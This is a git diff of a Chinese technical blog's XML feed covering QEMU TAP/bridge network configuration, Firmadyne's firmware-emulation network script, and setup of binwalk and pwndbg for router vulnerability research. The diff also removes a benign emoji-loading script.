-echo "Executing /etc/qemu-ifup"
-echo "bridge networking"
-echo "Bringing up $1 for bridge mode" #$1一般指tap0
-sudo /sbin/ifconfig $1 0.0.0.0 promisc up #启用tap0接口
-echo "Adding $1 to br0"
-sudo /sbin/brctl addif br0 $1 #在网桥中增加tap0接口
-sleep 3</code></pre>
-</li>
-<li><p>利用qemu系统模式启动镜像，指定网络连接模式是 TAP 即可。 </p>
-<pre class=" language-sh"><code class="language-sh">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap</code></pre>
-<p>参数含义：-net nic 表示希望 QEMU 在虚拟机中创建一张虚拟网卡，-net tap 表示连接类型为 TAP。默认选择tap0以及启动调用脚本 /etc/qemu-ifup。</p>
-<pre class=" language-sh"><code class="language-sh">-net tap,ifname=tap0,script=no,downscript=no</code></pre>
-<p>可以更具体指定网卡接口名称(就是刚才创建的 tap0，相当于把虚拟机接入网桥)。script 和 downscript 两个选项的作用是告诉 QEMU 在启动系统的时候是否调用脚本自动配置网络环境，如果这两个选项为空，那么 QEMU 启动和退出时会自动选择第一个不存在的 tap 接口(通常是 tap0)为参数，调用脚本 /etc/qemu-ifup 和 /etc/qemu-ifdown。</p>
-</li>
-<li><p>在ubuntu16.04上演示：</p>
-<p>在 /etc/network/interfaces 文件中配置网桥br0，在/etc/qemu-ifup中配置tap0。</p>
-<p>在qemu启动虚拟机之前，<code>ifconfig -a</code>查看网卡信息，此时已经有网桥br0了。</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/ifconfig.png" alt=""></p>
-<p>启动qemu时，自动调用/etc/qemu-ifup，启用tap0网卡并接入网桥中。这时<code>ifconfig</code>可以看见多了tap0网卡。</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/%E5%90%AF%E5%8A%A8qemu.png" alt=""></p>
-<p>使用root/root登入qemu虚拟机<code>ifconfig</code>查看网卡信息。</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/qemu_ifconfig.png" alt=""></p>
-<p>发现eth1网卡的ip地址为192.168.0.101，<code>cat /etc/network/interfaces</code>发现eth1是通过dhcp服务器分配ip地址的。</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE.png" alt=""></p>
-<p><code>ping www.baidu.com</code>能够ping通说明配置成功了。</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/ping%E7%99%BE%E5%BA%A6.png" alt=""></p>
-<p><code>brctl show br0</code>查看br0网桥列表，<code>brctl showstp br0</code>查看br0网桥的各接口信息。可以看到网桥连着两块网卡tap0和ens33。</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/%E7%BD%91%E6%A1%A5%E5%90%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF.png" alt=""></p>
-</li>
-</ol>
-<h1 id="Firmadyne中配置网卡部分"><a href="#Firmadyne中配置网卡部分" class="headerlink" title="Firmadyne中配置网卡部分"></a>Firmadyne中配置网卡部分</h1><p>文件：/firmadyne/scratch/x/run.sh(x是对应固件的编号，如果下载了schema并导入了postgresql数据库的话，则是按照数据库中的编号)</p>
-<pre class=" language-sh"><code class="language-sh">···
-#配置网卡过程
-TAPDEV_0=tap${IID}_0
-HOSTNETDEV_0=${TAPDEV_0}
-echo "Creating TAP device ${TAPDEV_0}..."
-sudo tunctl -t ${TAPDEV_0} -u ${USER} #配置网卡
-
-echo "Initializing VLAN..."
-HOSTNETDEV_0=${TAPDEV_0}.1 
-sudo ip link add link ${TAPDEV_0} name ${HOSTNETDEV_0} type vlan id 1 #相当于tap0是网桥，而HOSTNETDEV作为网桥的一端配置好ip接口，并且添加vlan网口，可以用ip link确认VLAN的创建
-sudo ip link set ${TAPDEV_0} up #启动tap0
-
-echo "Bringing up TAP device..."
-sudo ip link set ${HOSTNETDEV_0} up #将网桥一端的HOSTNETDEV启动
-sudo ip addr add 192.168.0.2/24 dev ${HOSTNETDEV_0} #配置IP为192.168.0.2
-
-echo "Adding route to 192.168.0.1..."
-sudo ip route add 192.168.0.1 via 192.168.0.1 dev ${HOSTNETDEV_0} #添加到192.168.0.1的路由给HOSTDEVNAME
-···
-
-# 利用qemu系统模式进行仿真
- ${QEMU} -m 256 -M ${QEMU_MACHINE} -kernel ${KERNEL} \
-    -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0" \
-    -nographic \
-    -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net0 -netdev socket,id=net1,listen=:2001 -device e1000,netdev=net1 -netdev socket,id=net2,listen=:2002 -device e1000,netdev=net2 -netdev socket,id=net3,listen=:2003 -device e1000,netdev=net3 | tee ${WORK_DIR}/qemu.final.serial.log
-    #-netdev tap,id=net0,ifname=${TAPDEV_0},script=no 指示网络后端为tap并且id=net0，对应的网卡设备为ifname指定的网卡，id是用来指定对应的后端，达到一对一的目的。</code></pre>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/41258581" target="_blank" rel="noopener">QEMU新的-nic选项</a></p>
-<p><a href="https://zh.wikipedia.org/wiki/TUN与TAP" target="_blank" rel="noopener">TUN与TAP</a></p>
-<p><a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>qemu</category>
-        <category>linux</category>
-      </categories>
   </entry>
   <entry>
     <title>路由器漏洞挖掘环境搭建</title>
     <url>/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从2019年5月开始决定把物联网漏洞挖掘作为自己的课题开始，到现在也断断续续调试分析过一些漏洞，感觉一路心酸历程啊！确实踩了很多坑，恰逢最近重新搭建环境，值此良机，整理下搭建过程。</p>
-<p>我使用的是ubuntu16.04 LTS虚拟机。</p>
-<h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>因为利用apt-get安装binwalk会缺少很多依赖项所以还是建议根据 <a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md" target="_blank" rel="noopener">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a> </p>
+    <content><![CDATA[<h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>因为利用apt-get安装binwalk会缺少很多依赖项所以还是建议根据 <a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md" target="_blank" rel="noopener">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a> </p>
 <pre class=" language-shell"><code class="language-shell">git clone https://github.com/ReFirmLabs/binwalk.git
 cd binwalk
 # 对于Debian/Ubuntu的用户而言，很多依赖项都可以通过deps.sh安装
@@ -2693,25 +2262,7 @@ cd pwndbg
 <p> <a href="https://xz.aliyun.com/t/462" target="_blank" rel="noopener">https://xz.aliyun.com/t/462</a> </p>
 <p><a href="[https://www.vulbox.com/knowledge/detail/?id=35%20%20](https://www.vulbox.com/knowledge/detail/?id=35">路由器固件安全分析技术（一）</a> )</p>
 <p><a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">路由器破解初探之环境搭建</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>iot</category>
       </categories>
